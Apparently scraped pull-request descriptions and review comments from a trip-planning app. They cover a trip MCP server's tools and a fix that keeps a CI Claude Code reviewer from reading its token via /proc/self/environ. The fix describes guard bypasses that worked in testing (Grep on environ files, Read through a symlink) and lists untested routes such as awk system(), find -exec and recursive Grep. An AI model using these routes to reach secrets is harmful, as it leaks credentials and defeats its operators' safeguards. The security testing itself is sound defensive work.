**This writes the "start date is after today at the start place" rule out again.** `setStartDate()` just below compares `startDate.compareTo(today) <= 0`, and `hasStartedOn()` / `startedToday()` in `src/domain/today.ts` already answer "is today at this place on or after this start date" (`today.compareTo(startDate) >= 0`). That makes three copies of one rule, which the doc comment says is the one rule this service holds. If the rule changes, such as letting a trip start today, each copy has to change. A private `#refuseIfNotAfterToday(startDate, place)` used by both methods, built on `todayAt()` or on `hasStartedOn()` with the calendar's clock, keeps one copy.

**The `from === null || to === null` test is now dead logic, and the ends are worked out twice.** `calendar.hasLeg()` already returns false when either end is null, so this test only narrows the type. But `#routeFor()` calls `fromPlaceOf()` and `toPlaceOf()` here, and `hasLeg()` calls them again, plus `isStayingPut()`, which calls `startStayOf()` and `endStayOf()` a third time. Having the calendar give the ends with the answer, such as a `legEndsOf(itinerary, day): { from, to } | null` that `hasLeg()` is built on, removes the extra test and the repeated lookups.

**`hasLeg()` walks the itinerary several times for one answer.** `fromPlaceOf()` and `isStayingPut()` each call `startStayOf()`, and `toPlaceOf()` and `isStayingPut()` each call `endStayOf()`. Each of those calls `orderOf()` / `previousDay()`, and each of those copies and freezes `itinerary.days`. `hasLeg()` runs on every `#timelineOf()`, which `openTimeInMinutesOf()` calls once per stop during the checks. So each write rebuilds the days list many times per stop. Looking up the start and end stays once, then working out the ends and "stays put" from them, does the same job.

**`#post()` is still copied between the two Google clients, and this PR changes both copies the same way.** `PlacesClient.#post()` and `RoutesClient.#post()` are the same code apart from the URL, field mask, error class, and message wording: the same headers, the same `AbortSignal.timeout`, the same `jsonBodyOf()` inside the try, the same `googleErrorBodySchema` status message. `json-body.ts` takes out only one piece of it. The next fix to how a call fails, like this one, has to be made twice again. Moving the whole post into `json-body.ts` (or a `google-post.ts`), with the error class and the API name passed in, keeps one copy.

**Only `<` is escaped, not `&`, so the escaping can't be undone and a review can look like escaped text.** A review that already contains `</place_content>` comes through the same as a real `</place_content>` that was escaped. Ordinary text like "Kids <5 eat free" reaches the model as "Kids <5 eat free". Escaping `&` first (`&`), then `<`, keeps the encoding exact, and the lead line could say the text is HTML-escaped so the model reads it right.

**A day whose ends aren't known now reports 0 minutes of driving, while its schedule says its drives aren't known.** `#timelineOf()` passes `driveMinutes: null` on such a day, because "the drives there aren't known to be 0" (day-timeline.ts), so its stops get unknown times. But `drivingInMinutesOf()` returns 0 for the same day, because `hasLeg()` is false. Before this PR, the first day of a trip with no start place got `null` here, since `#hasDrives` was true and the leg was null. The two calendar answers for one day now disagree. `isDriveHoursApprovalApplying()` treats 0 as known driving within any approval, and any later user of `drivingInMinutesOf()` will read "no driving" where the schedule reads "not known yet." Returning `null` here while `#areEndsKnown()` is false, and 0 only on a day known to have no drives, keeps the two answers the same.

**"Drives aren't known" is now encoded as `hasDrives: false` plus `driveMinutes: null`, which is easy to break.** `TimelineBuilder.#nextDrive()` used to ignore `driveMinutes` when `hasDrives` was false. Now the same pair of fields means three things: no drives (`false`, `[]`), unknown drives on a day with no drive entries (`false`, `null`), and unrouted drives (`true`, `null`). A future caller that passes `null` with `hasDrives: false`, which the old comment allowed, silently gets unknown stop times. `#timelineOf()` also works out `#areEndsKnown()` twice, once inside `hasLeg()` and once for `noDrives`. A single field such as `drives: "none" | "unknown" | readonly number[] | null`, or a separate `areTimesKnown` flag, says what each case means. `#nextDrive()` could then branch on it directly.

## Task

Complete phase 13a in the development plan. This is the creation of the trip MCP server.

## Done when

- [x] **Tests with fake repositories cover both tools as tool design section 2.1 describes them.** `src/tools/trip-brief-tools.test.ts` covers: a read of a new trip's brief shows every item; an update of several items saves them all; items not given are left alone; a trip length over 14 and comfortable driving over 12 are refused, save nothing, and the error gives the limit; emptying an item is refused and names it; an update with no items is refused; the usual start time is a clock time; a started trip refuses the update with the date it used; a busy trip gives the busy message; an item the schema doesn't name is refused, in a call through the real server, and nothing is saved; the reply's check results go from new, to already known, to gone; and changing the comfortable driving hours gives each day's driving warning again, with its new text. A test in `src/config/dependencies.test.ts` checks that every peer of a production dependency is listed as one, and a production-only install, as the Docker image does it, has the Agent SDK and its two peers. `npm run check` passes: 61 files, 487 tests.
- [x] **The PR shows the server's description, and each tool's description, input schema, and an example of what it returns.** Below. It comes from a run against the local Postgres, through an MCP client connected to the real server object, so the schema is the JSON Schema the model sees.

Checked by hand against the local Postgres: the trip's stored brief held the saved items, and the refused updates left nothing behind (`mustSeesText` stayed empty after the refused trip length of 20, and `focus` kept its value after the call with the misnamed `tripLength`). The test trip was deleted afterwards.

### Server description (`trip`)

> Reads and changes the trip this session is planning. The trip is already set, so no tool takes a trip ID. A change is saved at once, in one save: when any part of it is refused, nothing is saved, and the error says why. Each change replies with the feasibility check results it made new or gone.

### Tools, as `tools/list` returns them

```json
[
  {
    "name": "read_trip_brief",
    "description": "Reads the trip brief: what the user wants from the whole trip. Returns every item, one per line, by the name update_trip_brief takes. An item with no value yet shows as \"not set\".",
    "inputSchema": {
      "type": "object",
      "properties": {},
      "$schema": "http://json-schema.org/draft-07/schema#",
      "additionalProperties": false
    },
    "annotations": {
      "readOnlyHint": true
    },
    "execution": {
      "taskSupport": "forbidden"
    },
    "_meta": {
      "anthropic/alwaysLoad": true
    }
  },
  {
    "name": "update_trip_brief",
    "description": "Changes one or more items in the trip brief, in one save. Items not given are left alone. Each item given replaces its old value. An item can be changed, but never emptied. If any item is refused, nothing is saved, and the error says which item and why, with the limit when there is one. The reply doesn't repeat the items. It gives the feasibility check results that are new or gone, anywhere in the trip. It also gives the trip-wide ones already known, and every day's when comfortableDrivingInHours changes.",
    "inputSchema": {
```

nodes.body:
## Decisions

Phase 13a is settled in the PR, so each of these is a proposal. Approving the PR agrees to them.

1. **Each trip brief item goes by its name in the domain model**, such as `tripLengthInDays` and `mealPreferencesText`. The rule errors already name items that way ("The trip brief's focus can't be empty"), so the error matches the input. Written into tool design section 2.1.
2. **The usual start time is a clock time, in and out**, such as "7:30 a.m.". Tool design section 2.1 already says tool times are clock times. "07:30" is refused by the schema. Written into tool design section 2.1.
3. **`read_trip_brief` returns one line per item, as `name: value`**, with "not set" for an empty item. This is also in tool design section 2.1.
4. **Every input of `update_trip_brief` is optional.** That goes against the "no optional inputs" principle, but tool design section 2.1 says items not given are left alone, so it follows the design. An update with no items is refused.
5. **A refused write starts with "Nothing was saved."**, then the rule's message. Technical spec 5.2 tells the coordinator a refused update saved nothing, so the error says it in words. The busy-trip error already says so, and is passed on as it is.
6. **Only errors the agent can act on become a readable reply:** a broken rule, a busy trip, or a failed Google call. Any other error, such as a lost database connection, is thrown, and the Agent SDK reports it as a failed call. That keeps bugs from looking like normal refusals.
7. **The reply after a write is "Saved the trip brief." plus the check results.** Each result is one line, such as "- New warning: ...", "- Already known warning, approved: ...", or "- Gone: ...". When nothing is new or gone, it says "No new or gone check results." The check-results code is shared, so phase 22's writes can use it. Phase 22 adds the leg changes to the reply, as its "Do" already says.
8. **The server sets `alwaysLoad: true`.** Otherwise Claude Code can hide MCP tools behind a tool search when an agent has many tools. The coordinator will have 24.
9. **The code is in `src/tools/`.** `trip-access.ts` makes the app's `TripWriter`, with a `RoutesClient` from `env.googleMapsServerKey` and the global `fetch`, and the `TripReader`. Nothing calls it yet. Phase 13c's dev script will.

## Set aside

Nothing.

## Config changes that seem needed

None.

## Note on the schema

A schema error, such as a usual start time of "07:30", comes back as the Agent SDK's own MCP validation error. It includes our message, but wrapped in JSON (see the example in the description). It's readable, so I left it.

## Replies to the review of 8d3d3a1

**Fixed** in the latest commit:

> A misnamed item is silently dropped, and the reply still says "Saved the trip brief."

Confirmed against the real server first: `{ focus: "Utah", tripLength: 5 }` saved the focus and replied "Saved the trip brief." Both trip tools now take a strict object (`src/tools/strict-tool.ts`). The SDK passes it on as it is, so the model sees `additionalProperties: false`, and an unknown key is refused with `Unrecognized key: "tripLength"`. Nothing is saved.

> This description, and the new design line ("an error that names an item matches the input"), say the error names the item that was refused. The two limit errors do not.

The two `TripBriefService` errors now name the item: "The trip brief's tripLengthInDays is at most 14, since a trip is at most 14 days long. It was given 20."

> Without a `.min(1)`, `z.int()` puts `"minimum": -9007199254740991, "maximum": 9007199254740991` in the JSON Schema the model sees

`.min(1)` or `.positive()` alone would keep the fake maximum, since Zod gives every integer one. The input is now `z.number().positive()`, so the schema says only `exclusiveMinimum: 0`. The description says it's a whole number, and the brief refuses a fraction.

**Not changed:**

> `touchedIds` holds only the itinerary, and `result.legChanges` is never read.

A brief change re-routes nothing, as the finding says. Phase 22 adds the first writes that do, and its plan already says each write's reply is built from what the write hands back.

> `tripAccessFor` has no caller and no test.

It was run by hand against the local Postgres for this PR. Phase 13c's dev script calls it.

> `MINUTES_IN_HOUR` and `NOON_HOUR` are defined again here, the same as in `src/domain/check-text.ts`.

A cleanup, with no change in behavior. Left as it is.

A misnamed item is silently dropped, and the reply still says "Saved the trip brief." The SDK builds a plain `z.object` from this shape, which strips unknown keys, and the JSON Schema in the PR has no `additionalProperties: false`. Example: an update with `focus: "Utah"` and `tripLength: 5` saves only the focus, then replies "Saved the trip brief." The model believes the length was saved too. If every key is misnamed, the reply is "Give at least one trip brief item to change.", which does not say why. Tool design section 4 says "the tool never guesses". Refuse unknown keys, for example with a strict object schema if `tool()` accepts one, so the error names the key.

This description, and the new design line ("an error that names an item matches the input"), say the error names the item that was refused. The two limit errors do not: `TripBriefService` says "A trip is at most 14 days long..." and "Comfortable driving is at most 12 hours a day...", not `tripLengthInDays` or `comfortableDrivingInHours`. When several items are given, the model has to guess which input the error is about. Either name the item in those messages, or change the description to match.

`touchedIds` holds only the itinerary, and `result.legChanges` is never read. Tool design 2.1 says the reply to a write gives the new drive time of each re-routed leg, and counts "the days in the leg changes" as touched. A brief change re-routes nothing today, so nothing is wrong yet. But each writing tool will have to repeat this, and the next one could easily forget the leg days. A shared reply builder that takes the whole `WriteResult` and adds the leg days itself would cover every tool.

Without a `.min(1)`, `z.int()` puts `"minimum": -9007199254740991, "maximum": 9007199254740991` in the JSON Schema the model sees (shown in the PR). That says nothing true about a trip length, and costs tokens on every turn, since the tool is always loaded. `.min(1)`, or `.positive()`, would give the real lower bound. The domain rule still runs.

`tripAccessFor` has no caller and no test. Phase 13a says to give `update_trip_brief` a `TripWriter` whose `routeFinder` is a `RoutesClient` made from `env.googleMapsServerKey` and the global `fetch`. Only this function does that, and nothing runs it, so a wrong argument (for example, the wrong key) would go unnoticed until phase 13c. A small test that builds it from a fake pool and env, or wiring it in now, would cover it.

`MINUTES_IN_HOUR` and `NOON_HOUR` are defined again here, the same as in `src/domain/check-text.ts`. The 12-hour mapping is now split: `clockText` writes it in `check-text.ts`, and `timeOfDayFromClockText` reads it here. `clockTextOf` also works out minutes since midnight by hand, which `TimeOfDay` already does privately (`#minutesSinceMidnight`). Keeping the parser next to `clockText` would keep both directions of the a.m./p.m. rule in one file.

This comment, and `touchedIds` holding only the itinerary, assume a brief change touches no day. Two items do touch every day. `usualStartTime` is the start time of every day without its own (`Calendar.startTimeOf`, calendar.ts:145), and `comfortableDrivingInHours` is the limit in every `dailyDriving` warning. A day result that is still there after the change is "already known", so it is filtered out, even when its text changed. Example: Day 2 has "needs about 7 h of driving. Comfortable driving is 6 hours a day." The user lowers it to 5. The warning is still there, now saying 5 hours, but the reply is "No new or gone check results.", so the coordinator keeps the old text. The same goes for a late or opening-hours warning whose times moved with a new usual start time. Count the days that use the changed item as touched (for `usualStartTime`, the days with no start time of their own; for `comfortableDrivingInHours`, every day), or check that tool design 2.1 means to leave them out.

The description says the read "Returns every item, one per line". The text items are the words of the user, and nothing stops them from holding a line break. Example: `mustSeesText` given as "Delicate Arch at sunset", a line break, then "mealPreferencesText: none" is saved as given. The read then shows a line that looks like a second `mealPreferencesText` item, and the model can read the wrong value. Show line breaks in a value some other way, such as quoted text, or refuse them in the schema.

The repo-root CLAUDE.md says "Check outside data with Zod where it enters the program (DEVELOPMENT.md section 4)". That section lists "Tool inputs from the agents" as outside data, and says "Schemas for outside data go in files named `*.schema.ts`." `UPDATE_TRIP_BRIEF_INPUT` is the tool input from the agent, but it is in `trip-brief-tools.ts`. Moving it to a file such as `src/tools/trip-brief-tools.schema.ts` would follow the rule, and later tools would follow it too.

`strictTool()` builds the definition but takes no annotations, so `readTripBriefTool` spreads its result and patches `annotations` on afterwards. Every later read tool, such as `read_itinerary` and the memory reads, will have to repeat this, and the spread makes it easy to drop. An optional `annotations` argument to `strictTool()`, which `StrictToolDefinition` already has a field for, would make this one call.

The test checks `z.toJSONSchema` on the Zod schema itself, not the tool list the server gives. `strict-tool.ts` exists because the SDK can change the schema on the way through, by wrapping a plain shape in an object that drops unknown keys. This test would still pass if `createTripServer` went back to `tool()` with a shape, or if an SDK update stripped the strictness. A misnamed item would then vanish again, with "Saved the trip brief." Checking the input schema of the tools `createTripServer` hands the SDK, or making a call with an unknown key through the server, would catch that.

The touched set is now a special case for two brief items, and it is wider than what those items reach. `usualStartTime` adds every day ID, but the only checks with a day as subject are `dailyDriving` and `stopOrder` (`day-checks.ts`), and neither depends on the start time. The new test shows it: changing the usual start time to 9:00 a.m. repeats "Day 1 needs about 33 m of driving. Comfortable driving is 0.25 hours a day.", which did not change. The underlying problem (a result still there after a write is "already known", so its new text never comes back) also applies to every later write, such as a stop move that changes an opening-hours time. A more general fix is in `FeasibilityChecker.compare()`: report a known result whose text differs from its saved match. That would cover both brief items with no per-tool list, and repeat only results that actually changed.

The "may be too early" mark repeats what the result text already says. `markedTooEarly()` in `stop-checks.ts` appends "An earlier stop on this day has no place picked yet, so this time may be too early." to the text of every result with `hasUnselectedStopBefore`. So a real reply line reads "- New warning, may be too early: Milt’s closes at 12:30 p.m. ... An earlier stop on this day has no place picked yet, so this time may be too early." The test passes only because its fake text leaves that sentence out. Either drop the mark here, or stop appending the sentence in the domain.

This branch can never run. The write above always passes `"coordinator"`, and `TripWriter` gives a null `checkComparison` only for a `"worker"` write. If it did run, the reply would say only "Saved the trip brief." with no check results, which tool design 2.1 does not allow for a coordinator write. Throwing on null, or a writer method for coordinator writes whose result has a non-null comparison, would remove the dead path for every coordinator tool that follows.

An earlier comment on this call (now outdated) pointed out that `result.legChanges` is never read. The change since did not fix it: the touched set still leaves out the days in the leg changes, and the reply gives no re-routed leg times. Tool design 2.1 counts "the days in the leg changes" as touched for every write. A brief change re-routes nothing today, but `updateLegs()` runs on every write, so a leg it routes here would have the known results of its days dropped from the reply.

`@modelcontextprotocol/sdk` is needed at run time, not only by the tests: `createSdkMcpServer` in `trip-server.ts` builds an MCP server from it, and the Agent SDK lists it as a peer dependency. Listing it under `devDependencies` says production can do without it. It still installs under `npm ci --omit=dev` in `docker/app.Dockerfile` only because the lockfile reaches it through the peer edge of the Agent SDK. If that edge changes, the production image loses it. It belongs in `dependencies`, next to `@anthropic-ai/claude-agent-sdk`.

An earlier comment (now outdated) said a new `usualStartTime` touches every day's schedule. The change since did not fix it for the stops. A stop's opening-hours warning has the stop as its subject (`stop-checks.ts`), and its text gives the arrival time, which moves with the usual start time. Example: a warning on Milt's is already saved, and the user moves the usual start time from 8:00 a.m. to 10:00 a.m. The warning is still there with new times, so it is "already known", and its stop is not in this set. The reply says "No new or gone check results.", and the coordinator never sees the new times. The comment above says phase 22 covers this, but until then the tool description promises nothing about it. It could say that a new usual start time can change check results it doesn't list, or the set could hold the stops of days with no start time of their own.

Every day ID makes the reply repeat all of each day's already-known results, not only the driving warnings. `stopOrder` notes also have the day as subject (`day-checks.ts`), and they don't depend on the driving hours. This also happens when `comfortableDrivingInHours` is given with the value it already has. Example: on a 10-day trip with a few stop-order notes, re-sending `comfortableDrivingInHours: 6` lists every one of them as "Already known", which costs tokens and looks to the coordinator like it has something to raise. Filtering the known results to the `dailyDriving` check for these days, and only when the value changed, would give just what the design line asks for.

The description gives the lower bound and leaves out the upper ones. `tripLengthInDays` is at most `maximumTripLengthDays` (14), and `comfortableDrivingInHours` at most `maximumDailyDrivingHours` (12). The schema says neither, so the model only finds out by being refused. Example: a user asks for "about three weeks", the model sends 21, and the turn takes an extra round trip for the error. The schema also takes 2.5 here, though the description says a whole number. The domain refuses it, and `.int()` would be wrong for the reason the comment gives. Putting the limits, from the settings, into these two descriptions would let the model ask the user first.

This writes out "The trip brief's tripLengthInDays" by hand. `trip-brief.ts` already builds that prefix with `itemName()`, which every other trip brief error uses, including the fraction error for the same item. With two copies, renaming an item, or changing the wording, has to be done in both, or the errors stop matching the input names that tool design 2.1 now depends on. Exporting `itemName()` and calling it here and in `setComfortableDriving` would keep one copy.

The SDK has already checked `args`, so this parses the same input a second time on every call, just to get its type. The second parse also sits outside `writeReplyOrReadableError`. If the SDK's check and this one ever disagree (for example, after an SDK update changes how it handles a passed-in `ZodObject`), a `ZodError` comes out as an unexplained failed call instead of a readable refusal. `safeParse`, with its issues turned into an `isError` reply, would keep that case readable.

The PR description says this file also checks "a production-only install, as the Docker image does it, has the Agent SDK and its two peers". This is the only test in the file, and it reads the dev `node_modules`, where every package is installed. Nothing installs with `--omit=dev` as `docker/app.Dockerfile` does. So the "Done when" result claims a check that does not exist. Example: if a later lock file change marked `@modelcontextprotocol/sdk` dev-only, this test would still pass, and the image would fail when `createSdkMcpServer` loads it. Either add that test, or take the claim out of the description.

The server instructions say "Each change replies with the feasibility check results it made new or gone." The `update_trip_brief` description and its replies also give results that are already known: the trip-wide ones, and every day's when `comfortableDrivingInHours` is given (the PR shows "- Already known warning: The trip is 1 day, and the brief asks for 5."). So the model reads two different accounts of the same reply. Example: going by the server text, it can take an "Already known" line as something the change just caused, and raise it with the user again. The sentence should say what `checkResultLines()` gives: new and gone results anywhere, plus the already-known results for what the change touched.

`packageJsonAt("package.json")` and the `node_modules/.../package.json` paths are relative to the working directory, not to this file. The test passes only when Vitest runs from the repo root. Example: run from an editor test runner or a shell in `src/`, it fails with ENOENT, which says nothing about a missing peer. `new URL("../../package.json", import.meta.url)`, with the same base for `node_modules`, makes it work from anywhere.

This tests `writeReplyOrReadableError` from `tool-reply.ts`, but it sits in `trip-server.test.ts`. Every other new module has its test file next to it (`check-results-reply.test.ts`, `clock-time.test.ts`). Later writing tools will share this helper, so someone looking for its tests next to `tool-reply.ts` won't find them, and might add a second set. Moving this `describe` into `src/tools/tool-reply.test.ts` keeps it with the code it covers.

The PR description's second "Done when" result no longer matches the code, so the PR doesn't show what the model reads. Some differences:

- The server description in the PR starts "Reads and changes the trip this session is planning. The trip is already set, so no tool takes a trip ID...". The code's `TRIP_SERVER_INSTRUCTIONS` starts "Every tool that changes the trip makes the whole change or none of it."
- The PR's `update_trip_brief` input descriptions still give what each item means, such as "The user's interests, in their words, with why they matter." and "Scenic or fastest. A default for the trip." Those were trimmed in the code: `interestsText` is now "In the user's words.", and `routePreference` and `defaultTier` have no description.
- The PR's sample replies say "Saved the trip brief." and "Nothing was saved. ...". The code and tests now say "Changed the trip brief." and "Nothing was changed. ...".

Example: a reviewer who checks the item "The PR shows the server's description, and each tool's description, input schema, and an example of what it returns" against the PR approves text the model never sees. Running the same `tools/list` and sample calls against the current head, and replacing that section, would fix it.

body:
Fix open item 21: **The CI reviewer can still read the Claude token.** The scrub keeps it out of the commands the reviewer runs, but the Read tool runs inside Claude Code's own process, whose environment holds the token, through `/proc/self/environ`. Blocking `Read(/proc/**)` in the workflow may close it. Raised by the seventh review on PR #39.

## Done when

- **A local run shows the canary can be read before the change, and can't be read by any route after it.** Done. Claude Code 2.1.301 (the CI version) ran locally under `env -i` with the workflow's tool lists, the scrub, bubblewrap, and socat, and a fake value in `REVIEW_CANARY_TOKEN`. Before: Grep on `/proc/self/environ` and on `/proc/<claude pid>/environ` returned the value, and so did Read through a symlink to `/proc`. After: Read, Grep, and Glob on `/proc` were refused, including through the symlink, and the Bash routes were refused.
- **The same run after the change still reads repo files normally.** Done. In the after run, Read on `package.json`, Grep in `CLAUDE.md`, Glob on `src/**/*.ts`, `git log`, `cat CLAUDE.md | head -1`, and `git ls-remote` to GitHub all worked.
- **`npm run check` passes.** Done.

nodes.body:
## Decisions

- **The rule is `Read(//proc/**)`, in `--disallowedTools` in the workflow.** Claude Code's permission docs say a single leading `/` means relative to the settings file, and `//` means from the filesystem root. One `Read` deny rule covers Read, Grep, and Glob, and the Bash file commands Claude Code knows, such as `cat`, `head`, `tail`, and `sed`. It also holds when the path goes through a symlink into `/proc`, which the local run checked.
- **Routes found, before the change:**
  - Grep on `/proc/self/environ`, or on `/proc/<pid>/environ` with the PID from `/proc/self/status`, returned the value.
  - Read on those paths was refused by Claude Code's own "device file" guard. But Read on a symlink to `/proc` got through. The reviewer can't make a symlink with its tools, but a PR could commit one.
  - Glob on `/proc` listed paths only, not contents.
  - Bash: every command that named `/proc/*/environ` or `/proc/$PPID/...` was refused by Claude Code's built-in Bash check ("Accesses /proc/*/environ which may expose secrets", "A variable in this command can't be checked"). That held with `dangerouslyDisableSandbox` set too.
- **No change to `.claude/settings.json` is needed.**

## Not verified

- **Whether the sandbox itself hides other processes' `/proc` entries.** Every Bash route was refused before it ran, so the sandbox was never reached. Its docs say it mounts a fresh `/proc`, which would hide them.
- **A Bash read of `/proc/<pid>/environ` with a literal PID, outside the sandbox, with a command Claude Code doesn't treat as a file reader, such as `git diff --no-index` or `awk`.** The model declined to run those. The built-in check refused every `/proc/*/environ` form that did run. If that's not enough, `--settings '{"sandbox":{"allowUnsandboxedCommands":false}}'` in the workflow would stop commands from running outside the sandbox. That wasn't tested here, so it isn't added.
- **`gh` in the sandbox with the new rule.** The local run had no GitHub token, so it checked network with `git ls-remote` instead. The rule only touches `/proc`, so `gh` shouldn't change. This PR doesn't touch `src/` or `web/`, so it gets no CI review. The first review after it's merged will show it.

## Set aside

Nothing new.

**The temporary trigger comment would ship if merged.** The line says "Remove before merging," and a merge to `main` deploys (DEVELOPMENT.md section 7), so a missed removal puts it in the production `index.html`. Drop this commit (72f780f) before merging, or revert it in a final commit.

**Bash readers other than cat, head, tail, and sed are covered only by Claude Code's built-in name check for a process's environ file.** The allowed list also has `awk`, `grep`, `rg`, `jq`, `diff`, `sort`, `tr`, `cut`, `git`, and `find`, and per this comment the `Read(//proc/**)` rule only reaches cat, head, tail, and sed. A command that doesn't spell out the path gets past a name check: a wildcard in the file name, a `cd` into the process's folder under /proc and then a relative name, or a path built at run time through awk's `system()` or `find -exec` (which this comment already says can start a program). Whether any of these reaches the token then depends on the bubblewrap sandbox giving Bash its own PID namespace, so that Claude's process and its parent shell can't be seen. The workflow doesn't rely on that, and the PR didn't test it. Also, the sandbox's read-deny list in this run doesn't include /proc, so the Read deny rule isn't carried into the Bash sandbox. If one of these works, the token ends up in the transcript artifact (kept 30 days) and possibly in the step summary.

**A recursive Grep from the filesystem root (or from any folder above /proc) may not be covered.** The canary test ran Grep with the self and Claude-PID environ files under /proc as the path. But a Grep with the root as its path and a pattern matching the token's prefix makes ripgrep walk into those files on its own. That's only blocked if Claude Code turns the `//proc/**` deny rule into an ignore glob for rg relative to the search root, not just a check on the path it was given. Worth adding a Grep from the root (and from a symlink to the root) to the canary run before marking the item fixed.

**This fix depends on behavior of this exact Claude Code version, and nothing checks it.** Three things carry it: the built-in refusal of Bash commands that name a process's environ file, deny rules being matched after symlinks are resolved, and Grep and Glob honoring Read deny rules. None of them is a documented contract, and `CLAUDE_CODE_VERSION` is pinned only because the review recipe changes. Raising the pin to a version that changes any of the three would quietly reopen open item 21. The canary run was by hand and isn't repeated anywhere. A CI step that plants a fake value and asserts the reviewer can't read it, or a note next to `CLAUDE_CODE_VERSION` that a bump means re-running the canary test, would keep it from regressing.

**Item 21 is marked fixed, but the Bash routes that depend on a name check aren't written down anywhere.** The text says "nothing could after," but the test covered only the commands tried, and the workflow comment itself says only cat, head, tail, and sed are covered by the deny rule. Everything else depends on Claude Code refusing commands that name a process's environ file, and on how the sandbox handles PID namespaces. CLAUDE.md: "When something is set aside, in chat or during a phase, write it down right away. ... If not, add it to plan/open-items.md." Either keep a note on what's left here or open a new item for it, so the claim doesn't read as complete.
